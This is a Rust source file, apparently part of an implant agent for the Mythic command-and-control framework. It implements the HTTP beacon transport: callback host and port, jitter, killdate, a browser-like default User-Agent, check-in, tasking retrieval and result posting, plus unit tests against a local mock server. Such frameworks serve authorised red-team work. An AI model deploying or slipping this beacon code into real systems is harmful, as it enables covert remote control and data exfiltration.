//! HTTP/HTTPS transport for the Mythic `http` and `httpx` C2 profiles.
//!
//! Sends base64-encoded agent messages via synchronous HTTP(S) requests using
//! the small `ureq` client. Supports optional static AES encryption, optional
//! RSA EKE, optional proxy, and the common `callback_host` / `callback_port` /
//! `get_uri` / `post_uri` configuration pattern.
//!
//! GET tasking messages are placed in the configured query parameter using
//! URL-safe base64 (no padding) to match Mythic's requirements for query
//! parameters.

use std::collections::HashMap;
use std::time::Duration;

use base64::{Engine as _, engine::general_purpose::URL_SAFE_NO_PAD};
use ureq::{Agent, Proxy, ProxyProtocol};

use crate::{C2Transport, MythicError, MythicResult, protocol::codec::base64_decode_permissive};

use super::DEFAULT_USER_AGENT;

/// Configuration for the Mythic `http` / `httpx` C2 profile.
#[derive(Debug, Clone, serde::Deserialize, serde::Serialize)]
pub struct HttpConfig {
    pub aes_psk: Option<String>,
    pub callback_host: String,
    pub callback_port: u16,
    pub callback_interval: u64,
    pub callback_jitter: u32,
    pub encrypted_exchange_check: bool,
    pub get_uri: String,
    pub post_uri: String,
    pub query_path_name: Option<String>,
    #[serde(default)]
    pub headers: HashMap<String, String>,
    pub killdate: String,
    pub proxy_host: Option<String>,
    pub proxy_port: Option<u16>,
    pub proxy_user: Option<String>,
    pub proxy_pass: Option<String>,
    /// Optional override for the `User-Agent` header. Defaults to a common
    /// browser UA if not set.
    #[serde(default)]
    pub user_agent: Option<String>,
}

impl Default for HttpConfig {
    fn default() -> Self {
        Self {
            aes_psk: None,
            callback_host: String::new(),
            callback_port: 80,
            callback_interval: 10,
            callback_jitter: 23,
            encrypted_exchange_check: false,
            get_uri: String::new(),
            post_uri: String::new(),
            query_path_name: Some("id".into()),
            headers: HashMap::new(),
            killdate: String::new(),
            proxy_host: None,
            proxy_port: None,
            proxy_user: None,
            proxy_pass: None,
            user_agent: None,
        }
    }
}

/// Synchronous HTTP(S) transport.
pub struct HttpTransport {
    config: HttpConfig,
    agent: Agent,
}

impl HttpTransport {
    pub fn new(config: HttpConfig) -> MythicResult<Self> {
        let agent = build_agent(&config)?;
        Ok(Self { config, agent })
    }

    /// Build the base URL from `callback_host` and `callback_port`.
    ///
    /// Handles:
    /// - `callback_host` with or without scheme
    /// - `callback_host` that already includes a port
    fn base_url(&self) -> String {
        let host = self.config.callback_host.trim_end_matches('/');

        // If the host already has a scheme, trust it and avoid duplicating the port.
        if host.contains("://") {
            if let Ok(url) = url::Url::parse(host)
                && url.port().is_some()
            {
                return host.to_string();
            }
            return format!("{}:{}", host, self.config.callback_port);
        }

        // No scheme: infer https for common TLS ports, otherwise http.
        let scheme = if self.config.callback_port == 443 || self.config.callback_port == 8443 {
            "https"
        } else {
            "http"
        };
        format!("{}://{}:{}", scheme, host, self.config.callback_port)
    }

    fn post_url(&self, uri: &str) -> String {
        format!("{}/{}", self.base_url(), uri.trim_start_matches('/'))
    }

    fn get_url(&self, uri: &str) -> String {
        format!("{}/{}", self.base_url(), uri.trim_start_matches('/'))
    }

    fn send_post(&self, uri: &str, body: &str) -> MythicResult<String> {
        let url = self.post_url(uri);
        let mut req = self.agent.post(&url);
        for (k, v) in &self.config.headers {
            req = req.header(k.as_str(), v.as_str());
        }
        let resp = req
            .send(body)
            .map_err(|e| MythicError::transport(format!("{e}")))?;
        read_response(resp)
    }

    fn send_get(&self, uri: &str, query_name: &str, message: &str) -> MythicResult<String> {
        let url = self.get_url(uri);
        let encoded = to_urlsafe_no_pad(message)?;
        let mut req = self.agent.get(&url).query(query_name, &encoded);
        for (k, v) in &self.config.headers {
            req = req.header(k.as_str(), v.as_str());
        }
        let resp = req
            .call()
            .map_err(|e| MythicError::transport(format!("{e}")))?;
        read_response(resp)
    }
}

impl C2Transport for HttpTransport {
    fn get_aes_psk(&self) -> Option<String> {
        self.config.aes_psk.clone()
    }

    fn set_aes_psk(&mut self, key: &str) -> Option<String> {
        self.config.aes_psk = Some(key.to_string());
        self.config.aes_psk.clone()
    }

    fn encrypted_exchange_check(&self) -> bool {
        self.config.encrypted_exchange_check
    }

    fn checkin(&self, packed: &str) -> Result<String, MythicError> {
        self.send_post(&self.config.post_uri, packed)
    }

    fn get_tasking(&self, packed: &str) -> Result<String, MythicError> {
        match self.config.query_path_name.as_deref() {
            Some(q) if !q.is_empty() => self.send_get(&self.config.get_uri, q, packed),
            _ => self.send_post(&self.config.get_uri, packed),
        }
    }

    fn post_response(&self, packed: &str) -> Result<String, MythicError> {
        self.send_post(&self.config.post_uri, packed)
    }
}

/// Convert a standard/base64url base64 string into URL-safe base64 without
/// padding, suitable for Mythic query parameters.
fn to_urlsafe_no_pad(packed: &str) -> MythicResult<String> {
    let bytes = base64_decode_permissive(packed)?;
    Ok(URL_SAFE_NO_PAD.encode(&bytes))
}

fn read_response(resp: ureq::http::Response<ureq::Body>) -> MythicResult<String> {
    let status = resp.status().as_u16();
    if status >= 400 {
        return Err(MythicError::HttpStatus(status));
    }
    resp.into_body()
        .read_to_string()
        .map_err(|e| MythicError::transport(format!("{e}")))
}

fn build_agent(config: &HttpConfig) -> MythicResult<Agent> {
    let ua = config
        .user_agent
        .as_deref()
        .filter(|s| !s.is_empty())
        .unwrap_or(DEFAULT_USER_AGENT);

    let mut builder = Agent::config_builder()
        .timeout_global(Some(Duration::from_secs(30)))
        .http_status_as_error(false)
        .user_agent(ua);

    if let (Some(host), Some(port)) = (&config.proxy_host, config.proxy_port) {
        let mut proxy_builder = Proxy::builder(ProxyProtocol::Http).host(host).port(port);
        if let Some(user) = &config.proxy_user {
            proxy_builder = proxy_builder.username(user);
        }
        if let Some(pass) = &config.proxy_pass {
            proxy_builder = proxy_builder.password(pass);
        }
        let proxy = proxy_builder
            .build()
            .map_err(|e| MythicError::transport(format!("{e}")))?;
        builder = builder.proxy(Some(proxy));
    }

    Ok(Agent::new_with_config(builder.build()))
}

#[cfg(test)]
mod tests {
    use super::*;
    use httptest::{Expectation, Server, matchers::*, responders::*};

    #[test]
    fn http_post_checkin_roundtrip() {
        let srv = Server::run();
        srv.expect(
            Expectation::matching(all_of!(request::method("POST"), request::path("/data")))
                .respond_with(status_code(200).body("80844d19-9bfc-47f9-b9af-c6b9144c0fdcOK")),
        );

        let url = srv.url("/");
        let config = HttpConfig {
            callback_host: format!("{}://{}", url.scheme_str().unwrap(), url.host().unwrap()),
            callback_port: url.port_u16().unwrap_or(80),
            post_uri: "data".into(),
            get_uri: "index".into(),
            ..Default::default()
        };

        let t = HttpTransport::new(config).unwrap();
        let resp = t.checkin("hello").unwrap();
        assert!(resp.contains("OK"));
    }

    #[test]
    fn http_get_tasking_uses_query_param() {
        let srv = Server::run();
        srv.expect(
            Expectation::matching(all_of!(request::method("GET"), request::path("/index")))
                .respond_with(status_code(200).body("resp")),
        );

        let url = srv.url("/");
        let config = HttpConfig {
            callback_host: format!("{}://{}", url.scheme_str().unwrap(), url.host().unwrap()),
            callback_port: url.port_u16().unwrap_or(80),
            post_uri: "data".into(),
            get_uri: "index".into(),
            query_path_name: Some("id".into()),
            ..Default::default()
        };

        let t = HttpTransport::new(config).unwrap();
        let resp = t.get_tasking("YWJjMTIz").unwrap();
        assert_eq!(resp, "resp");
    }

    #[test]
    fn http_get_tasking_falls_back_to_post_when_no_query_name() {
        let srv = Server::run();
        srv.expect(
            Expectation::matching(all_of!(request::method("POST"), request::path("/index")))
                .respond_with(status_code(200).body("post_resp")),
        );

        let url = srv.url("/");
        let config = HttpConfig {
            callback_host: format!("{}://{}", url.scheme_str().unwrap(), url.host().unwrap()),
            callback_port: url.port_u16().unwrap_or(80),
            post_uri: "data".into(),
            get_uri: "index".into(),
            query_path_name: None,
            ..Default::default()
        };

        let t = HttpTransport::new(config).unwrap();
        let resp = t.get_tasking("hello").unwrap();
        assert_eq!(resp, "post_resp");
    }

    #[test]
    fn http_callback_host_without_scheme_gets_default() {
        let srv = Server::run();
        srv.expect(
            Expectation::matching(all_of!(request::method("POST"), request::path("/data")))
                .respond_with(status_code(200).body("ok")),
        );

        let url = srv.url("/");
        let config = HttpConfig {
            callback_host: url.host().unwrap().to_string(),
            callback_port: url.port_u16().unwrap_or(80),
            post_uri: "data".into(),
            get_uri: "index".into(),
            ..Default::default()
        };

        let t = HttpTransport::new(config).unwrap();
        let resp = t.checkin("hello").unwrap();
        assert_eq!(resp, "ok");
    }

    #[test]
    fn http_user_agent_is_browser_like_by_default() {
        let srv = Server::run();
        srv.expect(
            Expectation::matching(all_of!(
                request::method("GET"),
                request::path("/index"),
                request::headers(contains(("user-agent", DEFAULT_USER_AGENT)))
            ))
            .respond_with(status_code(200).body("ok")),
        );

        let url = srv.url("/");
        let config = HttpConfig {
            callback_host: format!("{}://{}", url.scheme_str().unwrap(), url.host().unwrap()),
            callback_port: url.port_u16().unwrap_or(80),
            get_uri: "index".into(),
            query_path_name: Some("id".into()),
            ..Default::default()
        };

        let t = HttpTransport::new(config).unwrap();
        t.get_tasking("aGVsbG8=").unwrap();
    }

    #[test]
    fn urlsafe_query_encoding() {
        assert_eq!(to_urlsafe_no_pad("YWJjMTIz").unwrap(), "YWJjMTIz");
        assert_eq!(
            to_urlsafe_no_pad("aGVsbG8/d29ybGQ=").unwrap(),
            "aGVsbG8_d29ybGQ"
        );
    }
}
